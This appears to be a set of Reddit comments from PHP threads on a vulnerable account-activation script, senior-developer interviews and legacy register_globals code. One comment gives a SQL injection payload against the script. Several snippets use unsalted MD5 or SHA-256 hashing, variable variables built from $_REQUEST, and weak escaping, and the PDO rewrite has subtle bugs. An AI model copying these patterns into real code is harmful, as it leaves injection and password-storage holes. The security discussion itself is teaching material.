ah interesting, interesting... well here's the whole code. Basically it takes a person's email address and lets them create a password for their account. It's for a small community of about 500 people. I hadn't really thought about security. I'm sure there's tonnes of issues in this? I wasn't too worried because there's very little stored on the database, only addresses and phone numbers of the users, no banking info or messages. &lt;?php $uemail=trim($_POST['email']); $unewpass=trim($_POST['newpass']); $unewpassc=trim($_POST['newpassc']); $con = mysql_connect("xxxxx","xxxxx","xxxxx"); if (!$con) { die('Could not connect: ' . mysql_error()); } mysql_select_db("cpaa", $con); //Array to store validation errors $errmsg_arr = array(); //Validation error flag $errflag_1 = false; //Input Validations if($unewpass == '') { $errmsg_arr_1[] = 'Old password missing'; $errflag_1 = true; } if($unewpassc == '') { $errmsg_arr_1[] = 'Confirm password missing. Make sure you enter your new password twice!.'; $errflag_1 = true; } if(strcmp($unewpass, $unewpassc) != 0 ) { $errmsg_arr_1[] = 'Passwords do not match!'; $errflag_1 = true; } $actcheck = mysql_query("SELECT activated FROM members WHERE email='$uemail'"); $actcheck_row = mysql_fetch_assoc($actcheck); if(($actcheck_row['activated']) == 'Y') { $errmsg_arr_1[] = 'This account has already been activated! If you have forgotten your password, please &lt;a href="contact.php"&gt;Contact Us&lt;/a&gt;.'; $errflag_1 = true; } //If there are input validations, redirect back to the form if($errflag_1) { echo '&lt;h2&gt;&lt;b&gt;Please try again:&lt;/h2&gt;'; foreach($errmsg_arr_1 as $msg_1) { echo '&lt;p&gt;',$msg_1,'&lt;/p&gt;'; } } else { mysql_query("UPDATE members SET activated='Y', passwd=MD5('$unewpass') WHERE email='$uemail'"); echo "&lt;p&gt;Account activated! Please &lt;a href=\"#"&gt;click here&lt;/a&gt; to login.&lt;/p&gt;"; } mysql_close($con); ?&gt;
Oh I totally agree: "or die" is a horrible way of dealing with errors, but at least it's better than nothing. Exception-based error handling is definitely the way forward.
Oh no, worries. Payment's unnecessary. I'm not 100% sure why it fixed it either, but I've found refactoring/cleaning things up usually helps any confusing situation. I add the die() statement as a quickie way to capture errors. Ideally, you have a wrapper class to run these queries (really ideally, you use PDO and perhaps subclass that) to capture any errors and log them or collect them for later use. You can also use that as an opportunity to time query execution and other fun things.
You should md5 the password before making your query. 
Yeah I second this... I used to use various template engines for my frameworks and ended up kicking it all out the door a couple years ago. Some people are hard-core over it, and I can see why, yes it's nice to separate COMPLETELY but if you do your business logic properly, you can keep the php minmal in your view files, few if checks, or foreach loops, nothing more to it. Its more portable and easier to maintain this way I've found. PHP and HTML can be hand-in-hand so why not :)
Yes. Which is why I said this is just the tip of the iceberg. =) I could have gotten into all that, but frankly, just getting someone to salt their password hashes would be a big win.
Might I suggest using [alternative control syntax](http://php.net/manual/en/control-structures.alternative-syntax.php) and separating out the html? Makes for cleaner code when you're outputting that much html. &lt;?php while ($row = mysql_fetch_assoc($result)): ?&gt; &lt;tr&gt; &lt;td&gt;&lt;?php echo $row['artist']; ?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $row['genre']; ?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $row['comment']; ?&gt;&lt;/td&gt; &lt;?php if($ip == $row['ip']): ?&gt; &lt;td&gt;DELETE&lt;/td&gt; &lt;?php else: ?&gt; &lt;td&gt;&amp;nbsp;&lt;/td&gt; &lt;?php endif; ?&gt; &lt;/tr&gt; &lt;?php endwhile; ?&gt; Of course you can also mix in the ternary operator: &lt;td&gt;&lt;?php echo ($ip == $row['ip'] ? "DELETE" : ""); ?&gt;&lt;/td&gt; Also, can I assume you started an anchor tag somewhere as well as the table? 
$row is only available within your while loop as it is only assigned on each iteration of the loop. if you want to use it later, assign it to another variable before exiting the loop... 
PHP is a templating language
True :)
Thanks, I will try this out. I simplified the code before I paste it here; missed that closing tag, and the &lt;table&gt; tag is above with the &lt;th&gt;. 
Heed these words, lad: at first you'll think to yourself, "Man, this shorthand is awesome! I should use it *everywhere!*" but I beg of you to ignore that thought. Write clean, self-documenting code, and don't worry about fitting as many things as you can into one line.
Can you post the job description? Be sure to study up on the company itself, seems people always mention that as helping a lot.
They may ask you if you can tie your own shoes. Jk they're Velcro 
Protecting against sql injection is not the point of md5'ing a password. The point is to store the password securely in the table to prevent unauthorized views.* * this is of course a poor technique for securing passwords. But nevermind that.
| I hadn't really thought about security. Dont' do it!!1 You're website would likely be turned into a spambot the second you flipped the on-switch. Those daily hits from China, Russia, and Florida with odd query parameters you see in your logs aren't just mis-clicks.
can you give me a specific example of how the spambot could do that?
Shit, I got this job bagged, then. Thanks!
&gt; If all information comes from a secure server-side source then it's not a vulnerability Except when the server is vulnerable.
No problem! GL with it, I wish I had real advice but I wasn't asked anything special, 
This exactly. Write simple code, not clever code.
Thanks for the tip.
Admittedly, it's not my first programming job, so I definitely bring enough company research to the interview. I've discovered that the person who has been in contact with me is one of the founders, so it appears he takes the company's welfare quite personally. That, or he just filed for incorporation, works in his basement...and I'm the first applicant. 
Storing the salt in the table is as good as just md5'ing the password and leaving it at that. If the table contents were stolen and passed around to harass users, all they'd need to do is perform a dictionary lookup against `md5(x + salt) = field` as apposed to regular `md5(x) = field`. Though this may not be how your site is set up, this would be probable enough to try first. As for the `md5` vs `sha1` problem, one can guess the encryption method used by number and sequence of characters in the field. The likely dictionary to use then becomes smaller. But if they got far enough to get a hold of your database, then they likely know for sure what specific technique your script used to encrypt the password. Sometimes it's just a short hop from database to directory.
The reason for a unique salt is for the instance when the hacker doesn't have the table contents. Now for the best of both worlds, you could salt the password twice: once with a randomly generated &amp; stored password, and once with a global salt.
I never said that that was the purpose, just that it was an effect. 
I believe the salt and encryption is for _when_ the hacker has table contents. With passwords encrypted, they can't as easily fake legitimacy with password in hand by successfully logging into the normal authentication page as a targeted user. It will take them some time to crack the passwords contained in the table dump. And by then if the data theft was detected, one should have informed all users to change their password or otherwise froze all accounts, etc. But this protects against a-holes who only wish to harass users, rather than just anonymously add a transaction here or there in other tables or just truncate everything. Certainly with database access you likely may then have access to read or alter files. So any salting technique is likely already learned. And in randocalrisian's case, an attacker may leave a backdoor open for future "research". I think a better way is to have a separate application which takes userID and password as input, and gives true/false 1/0 as return values. This application looks up the keys in a file invisible to the filesystem itself, let alone the http or scripting user. In fact one should be left wondering just what the hell this application is up to, if it's not plotting something against you even if you're root. This should save the web developer from even caring about storing passwords.
I like. Is that a common solution? Is there an open source or commercial package for doing this? Of course, you'd have to have dedicated hosting, right?
This is great stuff, thanks. It's about what I'm expecting. I'm not offended by your confidence. [Its need is very obvious to me](http://www.reddit.com/r/web_design/comments/f3y6i/what_secrets_do_you_have_to_keep_your_clients/c1d4l1b), particularly for interviews. Don't get me wrong, in the end I'll be relying on my knowledge, not what I've canned together in a few days, which is no match against the former. Nevertheless, asking those with titular experience to discuss their job and how they got it shouldn't be considered a betrayal of my confidence. You seem almost insulted that I'm being considered for the position. I swear I'd fit right in. 
To be honest, I just pulled that "mysterious authentication app" idea out of my ass. I imagine it could just be a very simple command line app handling only user=&gt;password key creation and lookup while hiding everything away in a quadruple-encrypted hidden file. It may be slower, but probably preferable to scrambling to freeze all user accounts or being taken to court by the state of [Massachusetts](http://en.wikipedia.org/wiki/Personally_identifiable_information#United_States_of_America). It just seems an appropriate solution to many the world's website password woes... for at least a little bit. There's already remote solutions like [Openid](http://openid.net/).
I know exactly what you mean. Despite what many people could construe as being an ass, I appreciate this post and the last one. In them, I see someone (you) who does not want a loser sullying the title for the rest of the real heads, which I respect; it's also an obvious sign that *you* have that passion spoken about in the first post. I'll admit, I took the job because it was above my credentials. Not drastically above them, but enough to keep me working harder than a true veteran. The last thing I want to experience is boredom. The last thing I want to do is carry an outdated toolset. That's why I'm moving up the scale. 
I bet you could have multiple mySQL users, limit table access for the mySQL user that your PHP uses, then create an API with some shell scripts that use your admin mySQL user to access the passwords table for explicitly adding / changing / dropping / validating passwords. Thanks for the idea!
You don't need to know everything under the sun. They may have you write some basic code over screen-share or something so be prepared for that, usually just to make sure you are good with the basics. Good PHP developers are also good leaders. They will want to see you can think on your own and provide results.
I believe having a mysql user with permissions limited to the scope of any script is already a recommended idea. One user for reads, one user for writes, one user for authentication, etc. I don't have cites, but a few google hits for mysql user security mentioned this. This limits the area of attacks. Now if only hosts could be convinced of this so they don't selfishly penalize customers for having too many mysql users or connects. Problem with that is the mysql user would have permissions for the entire column or table, so all passwords could still be written to or extracted with the right mysql user. Again, if they have access to the scripts, they can still see how this is all managed. Christ, I'm just being a debby downer tonight. But, if you had an outside app or source handling the authentication, then yes, the website _should_ be much more secure. Just watch for how much more time it takes to load pages. That _should_ just leave it up to brute forcing, and that is much more easier to detect.
Well, not extracted. PHP wouldn't have direct access to that mySQL user, and you wouldn't write a shell script (outside app) that would ever return a password; merely a true or false on validation.
Exactly. Except that PHP would have access to that mysql user if it's on the same host and the password is obtainable. You can't limit mysql user access by calling application. So, some different password storage location outside of mysql may be better. Maybe like a simple htpasswd file (user=password) deamon except on crack and ultra paranoid. Hell, I'll have to try this idea out for myself.
Here are some other skills you should have * Test Driven Development (TDD) / Behavior Driver Development (BDD) the gist is being able to write unit test. * Experience in another programing language besides PHP * Design patterns such as Observer, Singleton, etc. At the company I work for now we have a standard list of interview exercises that focus on communication and basic web development. The basic exercises help us to determine how capable you are of doing everyday stuff. Generally the people that are qualified make it through the questions faster than the people that aren't. If you've finished the questions in a reasonable amount of time, then we move on to general questions to get an idea of where your skill sets are at. I like to also like to use this time to ask about qualifications listed on your resume. I usually pick items thats are generally less know, so items such as the following [nginx](http://nginx.org/), [Drizzle](http://drizzle.org/), [Mongo DB](http://www.mongodb.org/), [Redis](http://redis.io/), [SproutCore](http://www.sproutcore.com/), [Django](http://www.djangoproject.com/), etc.
&gt; While md5ing the password prevents SQL injections from the password Ok, my mistake. Re-reading that makes more sense now: ie the password value itself is cleansed... but still there's the rest of the query.
Well, for starters, what would happen if the user entered this in the _email_ field... `' OR 'a'='a` Hint: if the very first record in your user table isn't activated yet, _all_ user passwords would be reset to `MD5('$unewpass')`. Then just imagine if the user threw `INTO OUTFILE` somewhere in there.
I've used both and very much prefer XAMPP
I think I'd have to disagree that giving out your table structure is necessary here. That's not even at issue here in your post. Certainly it is not something the world needs to see, and forever saved now on any google search. At this point, and I realize it will be a pain in the ass, I think you should rename all your fields and never again show your table structure to anyone. Would you show your junk to a stranger on the street?
You give good advice, but I wouldn't define a novice vs experienced PHP dev based on whatever arbitrary line you've drawn in the sand. I'm actually surprised you didn't include knowing how to use a VCS as one of your primary requirements. That shit's more important than knowing the difference between 5.3 and 5.2 or knowing what makes up an HTTP request. Especially since anyone could memorize those things in about five minutes. OP: you might find that a lot of jobs you apply for "senior" dev won't be you managing a team; it will be you working by yourself, or you with another guy who does HTML/CSS/JavaScript front-end. I know some people who make good money this way, and you don't want to write it off first thing. Just be wary of the guys doing the interviews from their house. Don't ignore them, just be wary. Things you should *definitely* know about: * a version control system (git, svn, cvs, mercurial) * a [database](http://secretgeek.net/dbcontrol.asp) migration [tool](http://www.liquibase.org/) * memcached * MySQL injection/XSS/CSRF mitigation techniques * MVC architecture * how to hack through really, really bad procedural programming * [optimizing MySQL](http://www.mysqlperformanceblog.com/) * optimizing Apache/lighttpd/nginx (hell, just knowing about lighttpd/nginx would be a big bonus in my book) * creating a RESTful API If you don't know something in that list, just Google it and teach yourself. Most bosses don't care if you can't name off every damn thing about the language as long as you give them great results. Knowing how to make Apache more efficient is way more useful than knowing about closures or namespaces if you can write a great app without them. Oh, and you'll never stop learning. Don't feel bad because you're the senior dev and you have to look up how to do something online; be proud that you're taking the initiative to learn it or figure it out. But always remember to **back up everything**. If there's one thing I've learned from leading a couple of projects, it's that someone somewhere is out to fuck you up and the best thing you can do if that happens is to tell your boss "we make nightly/twice-daily back-ups, no worries". **edit**: seems like I came off as a bit of an asshole. Not sure why I didn't notice it last night, but sorry about that.
You'll also need all the social skills required. Boss and employee management. Know when to stand your ground, when to give in. When to stick up for employees (mistakes due to personal problems, poor spec, misunderstanding, poor communication skills, etc.) I'd be looking for those sorts of insights when interviewing. I'm always loooking for the "Hmmm, +1 insightful" thought as I listen to someone answer.
I think, these are graduate-level skills, not senior-level developer's.
I haven't actually tried. But Among the open source PHP CMS, TomatoCMS has equal amount of feature set. It is using Zend framework. TomatoCMS is worth to consider. Give a try. If you are interested in writing any article about CMS / comparision of CMS / any open source related technology. Drop a message. You will get a link back to your site. 
The point is to store *a hash* of the password, not the password itself in any recoverable form.
Basically, deal with data binding in a secure way first, *then* ask questions about your query. If you are putting string variables into SQL statements directly, this will be the issue that people will bring up first. Learn to walk before you can run, and it won't come back to bite you later.
Yes, you should be doing things using templates. I never said they would not be written in PHP.
For instance, in an MVC framework you'd have a "view". But on a more basic level, it's best to separate your code that generates information and your code that displays it, and it's also good to move it to separate files as this aides re-usability and maintainability. I mean personally I'd do things way differently, but I'll demonstrate on a simple level: # firstfile.php &lt;?php $ip = $_SERVER['REMOTE_ADDR']; $sth = $pdo-&gt;prepare("YOUR QUERY") $sth-&gt;execute(); $rows = $sth-&gt;fetchAll(\PDO::FETCH_ASSOC); require('templates/template.php'); # templates/template.php &lt;table&gt; &lt;?php foreach($rows as $row): ?&gt; &lt;tr&gt; &lt;td&gt;&lt;?=$row['artist']?&gt;&lt;/td&gt; &lt;td&gt;&lt;?=$row['genre']?&gt;&lt;/td&gt; &lt;td&gt;&lt;?=$row['comment']?&gt;&lt;/td&gt; &lt;td&gt;&lt;?=($ip == $row['ip'] ? 'DELETE' : null)?&gt;&lt;/td&gt; &lt;/tr&gt; &lt;?php endforeach;?&gt; &lt;/table&gt; So now you have clean, portable(r) code that doesn't mix up presentation and system logic.
Nope because these are prepared statements.
Which is why you should never use MD5 :D
I've rewritten your script in a way that would make me less likely to punch you (no offence) if I inherited it: &lt;?php $errmsgs = array(); $uemail = trim($POST['email']); $unewpass = trim($POST['newpass']); $unewpassc = trim($_POST['newpassc']); $pdo= new PDO("mysql:host=xxxxx;dbname=cpaa","xxxxx","xxxxx"); // Validation should really be handled in another class. if(empty($unewpass)) { $errmsgs[] = 'Old password missing'; } if(empty($unewpassc) { $errmsgs[] = 'Confirm password missing. Make sure you enter your new password twice!.'; } if(strcmp($unewpass, $unewpassc) != 0 ) { $errmsgs[] = 'Passwords do not match!'; } // Check the account $actcheck = $pdo-&gt;prepare(" SELECT activated FROM members WHERE email = :uemail"); $actcheck-&gt;execute(array( ':uemail' =&gt; '$uemail' )); $actcheck_row = $actcheck-&gt;fetch(\PDO::FETCH_ASSOC); if(($actcheck_row['activated']) == 'Y') { $errmsgs[] = 'This account has already been activated! If you have forgotten your password, please &lt;a href="contact.php"&gt;Contact Us&lt;/a&gt;.'; } //If there are input validations, redirect back to the form $error = (count($errmsgs) &gt; 0 ? True : False); if(!$error) { $sth = $pdo-&gt;prepare(" UPDATE members SET activated='Y', passwd = :mdpass WHERE email = :uemail"); $sth-&gt;execute(array( ":mdpass" =&gt; hash('sha256', $unewpass), ":uemail" =&gt; $uemail )); $success = True; } ?&gt; &lt;?php if($error): ?&gt; &lt;h2&gt;Please Try Again&lt;/h2&gt; &lt;?php foreach($errmsgs as $msg): ?&gt; &lt;p&gt;&lt;?=$msg?&gt;&lt;/p&gt; &lt;?php endforeach;?&gt; &lt;?php else if($success): ?&gt; &lt;p&gt;Account activated! Please &lt;a href=\"#"&gt;click here&lt;/a&gt; to login.&lt;/p&gt;"; &lt;?php endif;?&gt; Hope this helps. Personally I'd wrap it all up inside a class and split it into methods though. Also you could get away with doing one query if you gave a slightly more ambiguous error message: $sth = $pdo-&gt;prepare(" UPDATE members SET activated= 'Y', passwd = :mdpass WHERE email = :uemail AND activated = 'N'"); $sth-&gt;execute(array( ":mdpass" =&gt; hash('sha256', $unewpass), ":uemail" =&gt; $uemail )); if($sth-&gt;rowCount() &gt; 0) { $success = True; }
If anything it's MORE of a vulnerability if it's done server side. Look up http://en.wikipedia.org/wiki/SQL_injection
Smarty is fairly unnecessary.
&gt; Set up a server environment from the ground up (that means compiling PHP, Apache, MySQL, etc). You have to know your way around Linux very well. This sounds like something for an administrator, not a developer. I could understand being able to install from packages, but compile from source? That's really an administrative task.
Read up on design patterns and terminology. We use them every day, but when you get tongue tied in interviews it's best to sound like you know what you're talking about.
I've always benefited from letting resume speak to technical ability, and using the interview speak to my interpersonal ability and customer service skills. The fact of the matter is that if you're faced with a technical problem that you don't know, you're going to research it and figure it out. What's important to the business is that you can see beyond your technical role and understand how the business needs to function to compete and succeed. How do you work with the other people there? That sort of thing.
&gt; If you've been primarily using CodeIgniter you're a novice PHP developer. Huh? Care to expand on that?
&gt; Is there any way to detect them and append $_POST to them or something? They will already be in $_POST. Not sure what you are trying to do here.
Wow, you have no idea what you're talking about. Striving for 100% test coverage is usually pointless, but at LEAST having your critical business logic well tested is EXTREMELY important. It pays for itself the second you need to refactor anything, or add on a feature which may have unintended consequences to that core business logic.
I'd say this is arguable depending on the size of the company, the size of the project(s), and how many hats each developer is expected to wear.
As in, they are looked for in a whole bunch of scripts without the $_POST['var'], they are just $var. Meaning if I take out that command, a whole bunch of shit fails.
Use this interview as a chance to evaluate the company as well. If they aren't asking you questions you deem to be important for a good developer (especially senior developer) to know, it's likely they aren't a very good company with skilled developers. Also senior developer means different things in different contexts. For instance, if you're being interviewed at a web company that just deploys Wordpress sites, a "Senior" developer is someone who knows how to hack up Wordpress - not exactly a tall order. If you're interviewing with a professional services company that does websites, but also builds web applications, or with a SaaS or product company, this is where you want to make sure they aren't fully staffed with Wordpress hackers who are slapping together awful software (this is extremely common and a stereotypical problem in the PHP community. Anyone can write PHP, few can write PHP WELL). I guess my point is, make sure the company has something to offer YOU in addition to what you have to offer the company. I've been in very few developer interviews where they've asked me to write code, or gave me pointless syntax trivia. Most interviewers were interested in my experience, my approach to solving problems on projects I've done, how I've coordinated a team, how I organize a project, how I determine timelines, etc When I interview people I like to ask people to tell me about a project they are proud of. You'd be surprised how many people stumble horribly on this question. It doesn't matter how big or how small the project is - if you've never written anything you can feel proud of, why would I want to hire you here? I love to see a developer get excited and tell me about some project they worked on and the cool things they did to solve tricky problems. That tells me so much more about a developer than anything else.
Oh wow, $_REQUEST. I forgot that existed.
We're set to America/Chicago, which should be right for our area. At any rate, it "fixed" itself when the date flipped over to Feb 1.
I presume that you want to change the code so that you would know, which variables are local to the file and which ones are passed around with get and post methods. In order to "automatically" do that, you would either have to * Run the program in every possible input condition, so that you could sniff the variables from http traffic or maybe attach a logger to every files' beginning. Unfortunately, it isn't quite feasible for humans or computers to do the "every possible condition" -part. * find every '&lt;form' and '&lt;a' -string from the code and parse the code next to them. This is hard even for humans and assumes that form and link tags are outputted like this. So, no for the automatic part.
well, you can probably write something to parse the error log for only those uninitialized var errors. Then use that to compile a list of variables which are expected in the code. Then perform a global replace on that list of variables across all source files (with backup first, obviously). Something like that might work.
So, and excuse me if this is a shitty idea, you could run a find on each $var and replace with $_POST['var'] via a script.
True, I'm novice, know about the http request and new features of php 5.3 and have no idea what VCS is 
if you need to know the variable names you could always print_r($_POST); to view the the variable names for each page (only do this to test though, it's not exactly secure)
But.. but... I don't need a database migration tool.
I think that was a general idea, but based on my experience as well **many** CodeIgniter developers are rather novice. Note that it is from my experience and meeting CodeIgniter developers. Also I'm not really surprised, as many developers use CodeIgniter as a entry level framework.
Yeah but it's knowing which vars there are, and having to replace them on &gt;100 scripts. Also the names are re-used and stuff. My current solution is to make a big array of the vars that are required from the POST and just do this: /** * Basically translate the required POST variables into scope ones. * Fuck my life. */ $vars = array( 'cid', ........ 'comp_lastname' ); foreach($vars as $var) { if(isset($_POST[$var])) { ${$var} = $_POST[$var]; } } It's ugly and horrific but reasonably secure and less awful than before.
Not a perfect solution, but try something like this: $keylog = unserialize(file_get_contents('/somewhere/mylog.serialize')); foreach($_REQUEST as $key=&gt;$value) { $$key = mysql_escape_string($value); $keylog[$_SERVER['SCRIPT_FILENAME']][$key] = true; } $fp = fopen('/somewhere/mylog.serialize.tmp','w'); fwrite($fp, serialize($keylog)); fclose($fp); exec('mv /somewhere/mylog.serialize.tmp /somewhere/mylog.serialize'); Now run through the program for a bit. Try every combo of posting and interaction that you can. You'll have a nice little log of posted keys.
Change the order that variables are put into $_REQUEST in your php.ini file (request_order) then use this loop to properly clean the input. It's not a perfect solution, but it improves the script a little and saves having to find everything and replace it.
You think that's bad, try extending a shop system created early 2000 and being told NOT to fix the shoddy programming. And they wonder why the staff are having trouble picking up Zend framework!
Interesting idea actually, might look into that.
Hey, guess what? Maintaining old stuff sucks, and it'll never go away. Unless you hire some poor coder from india (or china, or down the block) to do it for you, you'll always have to do maintenance work. We all do, so suck it up and deal. Yes, it's hard. Yes, it takes time. But if you put in the time to make it work properly, hopefully next time it's not going to be such a PITA. This isn't supposed to be easy. If it was, you'd be using a VB GUI to drag and drop buttons on a web app, and you'd never know how bad the code was. So, here's what you do: 1. Copy Code 2. Remove the ugly $$key = mysql_escape_string($value); part. Actually, that whole loop. 3. Then, for every single variable, do a global find an replace with the correct $_POST var. 4. Test until it works like it should. 5. Deploy to real site. 6. Repeat for every file Of course, that's kinda crappy, so start with one file and work your way through it as you make other updates to the code. 
Odd, that part of my reply didn't sound as dickish in my head last night. My apologies.
My comment was intended at the OP, not your code. I should have made that clearer. 
You might not need it, but know it's there. ;) If you have more than one person working on the database at any time, you will absolutely love some sort of database migration. The second one I linked to offers backups and quick restores, too.
My comment was an elaboration for the OP, not a reply to parent. My bad for not making that clear. 
Rainbow tables mean that for passwords 99% of the population actually use, storing unsalted md5s is about as useless as storing plaintext. 
My first job (a junior dev for a somewhat-popular site) had me using CVS, so I learned the basics of that. Then I discovered git and github, and that thing's been a god-damned god-send. It's supposed to be a distributed VCS, but I don't really have anyone I work with anymore, so I just use it for myself. Learn [why you should be using a VCS](http://progit.org/book/) then learn [how to use it](http://gitref.org/).
Why does maintaining old projects suck? Don't overwork yourself and just patch any issues and go on.
I used to do foreach ($_REQUEST as $key=&gt;$value) { $"whaveverReq{$key}"= addslashes($value); } This was cleaner… That said, dirty old code is job security.
the solution here is to constantly push for a rewrite of the code base. Just remember a few important things about this: 1. Know you can do it better, and prove you can do it better before starting. Having a background in full on backend architecture design helps. Knowing some design practices to follow and WHY, knowing what ones not to follow and why. Having a framework which lays the groundwork that is comfortable for you. 2. Your boss is thinking of this in terms of business not your own personal comfort in programming. Prove to them why it's financially responsible to rewrite the site. For example: a change that should only take you 5 minutes takes you 4 hours. For every 5 minute change that takes four hours, time could be better spent rewriting the code base(about a 2-3 month project) then you will be able to accomplish 5 minute tasks in 5 minutes. 3. Be patient. They may like the "idea" first but will want to wait until some big features are live on the piece of garbage website, but now that you've planted the idea how much easier these features will be, they will ask you something like "If the site was rewritten, how long would this take?" At which point you can provide some sort of lose time frame, which will seem golden to them compared to what they are looking at. Eventually they will sit down and realize that it's important to do this. And being armed with information such as spending a month writing a feature, to have to rewrite it to improve productivity, and the rewrite will take a week for this feature. They will realize their choices: continue to sink monkey into a broken system or, immediately move forward with a full rewrite. I've accomplished this three times in my career. Each time was successful, though my estimates were not always on track, but you will already know how you are with estimating projects and should be able to guess if you over estimate or underestimate(I under estimate on projects). TL;DR- Delete everything and start over.
Here's what you do: 1. `cd` into your main script directory 2. `grep -r '$_REQUEST' *`
Testing business logic is not TDD, most TDD advocates I've encountered are indeed circlejerk time wasting fools. You don't skip testing all together.
~~$_REQUEST~~ $HTTP_GET_VARS FTFY
you probably want to escape the $ :)
&gt; If I ask you to name 5 new features in PHP 5.3, can you? If not, you're a novice PHP developer. Sorry. 2 or 3 maybe. 5? Surely you jest. Most devs may use Namespaces and Closures, GC improvements don't require special code. So that's the big 3 maybe/situational items. What's on your list of these 5 must know or be novice new features? 
I'd add opcode caching to that list. 
Nice idea, but unfortunately they all just include the `adminheader.php` file, and there's no way to discern what variables are got from $_REQUEST.
I don't think you understand what's going on. $_REQUEST only exists in one place.
what would some of those basics be, exactly? I'm learning. 
Thing is, I'm freelance, we're trying to get this thing out, the system is horribly complicated, and this system is part of a different re-write. It does it's job, is part of a CMS, it's just horrible and awful. My boss is a nice guy, and values my opinions on technical issues, but he was a designer and inherited the company which has been making sites since 1995 and hasn't updated many of them. I could start over, but I don't have the time to do it (I'm part time, whenever I don't have lectures). I do agree with your sentiment and generally do push for things in this way, however the scope of the rewrite would take me months due to the size of this site (the part I'm working on is only a tiny fraction of it), plus I'm not 100% accustomed to all the weird little hacks and behaviours that have to exist. I'd be lovely to just create a brand new schema, massage all the old data into it, and write a pretty, slick, MVC system around it in some sort of framework (I prefer mine, but it's not mature enough, and there's so damn many out there), but the time investment isn't something I can manage at the moment. In actual fact, I'm trying to modularise the functionality to an extent so that if I were to rewrite, I could port logic etc of the old code over without rewriting. It's hard, though.
Well currently I'm changing it from using the mysql extension with horribly insecure queries, to PDO with prepared statements.
I would if I were using double quotes ;)
Fair enough, and you're right.
Oh. Shit. I thought $\_REQUEST was used all over.
&gt; Then, for every single variable, do a global find an replace with the correct $_POST var. What I'm doing at the moment is building up an array to replace the values, and then having it flag when it's done a replacement that isn't in the array, and adding it to the array. Sorta "learning". Once I've done that, I can either leave it or replace the variables.
*shudder*
It's very useful in converting a CSRF or XSSable post form into get request.
like "tail -f /var/log/httpd/error.log | grep uninitialized"?
Oh, I get it. This is terrible. The logic of the application is contained within functions, I was guess that the variables from $_REQUEST are all be called using `global`. I would use TextMate to do a project-wide regex search to pull all occurences of `global \$[A-Za-z0-9]+`. Might be a starting point.
I'm currently freelance as well, so I understand the type of money crunch your boss is under. Maybe the best suggestion here, is for you to volunteer with an open source framework, and pimp yourself out to jobs built on said framework. This will at least ensure a proper starting point for your projects you get working with the framework, and given the fact you're helping with writing it, it's pretty easy to land a job. conversations tend to go like so Client: "Are you familiar with xx framework and yy library(which is apart of xx framework)" You:"Why yes I am, I volunteer with building of the framework. and actually am the lead developer on the yy library" client:"when can you start?" I've done this personally and find it works well.
I get the idea of separating code, but I got a little lost in some of your code in firstfile.php. I see it like this: $ip = $_SERVER['REMOTE_ADDR'] Applies users IP to $ip variable $sth = $pdo-&gt;prepare("YOUR QUERY") Not sure what this is doing or what "-&gt;" does, but it's setting that code to work in the variable $sth. (does 'sth'/'pdo' stand for anything? Do I replace "YOUR QUERY" with SELECT* FROM.... $sth-&gt;execute(); Executes retrieval query $rows = $sth-&gt;fetchAll(\PDO::FETCH_ASSOC); A little confused on this. This retrieves the info from the database and the foreach loops this within the table? require('templates/template.php'); Tells the code to find the &lt;table&gt; info in templates/template.php? 
I imagine that at this point, had E_NOTICE been used all this while, the error log would be several gigabytes. Just pray it's rotated often.
object-oriented design, datastructures, performance analysis ... depends on the job. They'll usually ask something easy like FizzBuzz (Google it) or finding anagrams from an array of strings just to see how your brain works.
I use it sometimes when building forms that take GET variables via /?id=23 which also submit via POST (and a hidden input name="id" value="23").
Yeah, if `register_globals` is on (In haywire's case, it might as well be), without having the exact list of `post` and `get` keynames for the entire application, there's no way to tell if an uninitialized variable was intended to be auto-populated. There is an automatic way to detect all these though - Netbeans, or likely several other IDEs. Even if you don't like the IDE and don't want to continue using it, you can still just use it this one time to automatically flag all uninitialized variables.
As a PHP-semi-novice, I was about to ask what was wrong with this situation. Then I saw "$$key." Then I thought "oh... shit." Sorry, and good luck man.
Just an FYI, that's bad practice. It has a significantly higher overhead than the individual $_GET, $_POST and $_COOKIE variables. On top of that a user could override a value that should have come from $_POST with a $_GET or even a $_COOKIE. It has some uses, just use it sparingly.
thanks. 
I had a similar problem. I knocked up a class with a __toString method that returned the string given to it's constructor and logged where it was used. Changed: $$key = $value; To: $$key = new StringLogger($value); Left it logging on a production box for a couple of weeks. Managed to find nearly all of the code that relied on those variables from the log after passing it through sort | uniq. 
&gt; Not sure what this is doing or what "-&gt;" does, but it's setting that code to work in the variable $sth. (does 'sth'/'pdo' stand for anything? Do I replace "YOUR QUERY" with SELECT* FROM.... You do replace "your query" with your SELECT etc etc query. The `$object-&gt;method()` syntax is pretty vital for working with PHP. This assumes you have a [PDO](http://uk2.php.net/pdo) instance called $pdo. When you call the `prepare` method on a `PDO` instance, it returns a `PDOStatement` object, which we then manipulate with the `fetchAll()` and `execute()` methods. I'll write a simple script to demonstrate: // This instantiates a PDO object (http://php.net/pdo), which you can think of as a database connection. $pdo = new PDO("mysql:host={$host};dbname={$db_name}", $username, $password); // Personally I like PDO to throw back any errors it has as exceptions. If you don't want to delve // into exceptions just yet, leave this out, but I find they are much more useful than normal errors. $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // This creates a PDOStatement object (http://uk2.php.net/manual/en/class.pdostatement.php) which is // loaded with your query (it executes some SQL in the background to prepare your statement) // We also have a named parameter :myField that we can bind to a variable at a later point. // This is great because we *don't* have to escape it in any way to avoid SQL injection. $sth = $pdo-&gt;prepare(" SELECT * FROM myTable WHERE myField = :myField "); $myVariable = "something"; // This executes the SQL query, binding the parameter as we go. $sth-&gt;execute(array( ':myField' =&gt; $myVariable )); // We could now do several things with our statement. // We could find out the number of rows. echo $sth-&gt;rowCount(); // We could iterate through the rows: (this is equivalent to mysql_fetch_array()) while($row = $sth-&gt;fetch()) { var_dump($row); } // We could iterate through the rows without getting the numerical indices, like mysql_fetch_assoc() // I prefer this as it doesn't unnecessarily double the data you get. // I've added in \ before the constant so it will work under a namespace in PHP5.3. Remove this if // your PHP version is &lt; 5.3 as it will break. while($row = $sth-&gt;fetch(\PDO::FETCH_ASSOC)) { var_dump($row); } // Or we can grab all the results into one big array $rows = $sth-&gt;fetchAll(\PDO::FETCH_ASSOC); var_dump($rows); &gt; Tells the code to find the &lt;table&gt; info in templates/template.php? Essentially yes, it includes the whole file *and processes it*. Hope this helps, and good luck on your way to writing clean, safe, code.
